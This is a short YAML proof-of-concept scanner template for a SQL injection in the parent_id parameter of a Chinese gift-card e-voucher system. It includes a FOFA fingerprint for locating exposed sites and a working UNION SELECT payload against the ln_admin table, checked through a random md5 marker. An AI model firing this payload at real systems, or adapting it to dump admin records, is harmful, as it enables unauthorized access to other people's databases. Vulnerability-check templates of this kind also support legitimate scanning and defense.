id: poc-yaml-gceccs-parent-id-sqli
info:
  name: 礼品卡电子券收卡系统 parent_id SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 礼品卡电子券收卡系统
  fofa: body="/Application/Home/Static/css/style2.css"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /Home/Api/getRegion/parent_id/1)%20union%20select%201,2,md5({{.t1}}),4,5,6,7,8,9%20from%20ln_admin%20where%20(1=1
  expression: 'status_code == 200 &&

    contains(body,"<option") &&

    contains(body,t2) &&

    !contains(body,"<html")

    '
transport: http
